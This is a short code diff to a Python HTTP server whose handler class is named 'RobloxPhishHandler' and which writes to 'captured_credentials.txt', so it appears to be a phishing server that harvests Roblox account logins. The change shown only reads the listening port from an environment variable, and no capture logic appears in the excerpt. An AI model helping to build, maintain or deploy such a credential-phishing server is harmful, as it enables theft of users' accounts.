@@ -2,8 +2,8 @@ import http.server
 import socketserver
 import urllib.parse
 import datetime
-
-PORT = 3000
+import os
+PORT = int(os.environ.get("PORT", 3000))
 CAPTURE_FILE = "captured_credentials.txt"
 
 class RobloxPhishHandler(http.server.SimpleHTTPRequestHandler):
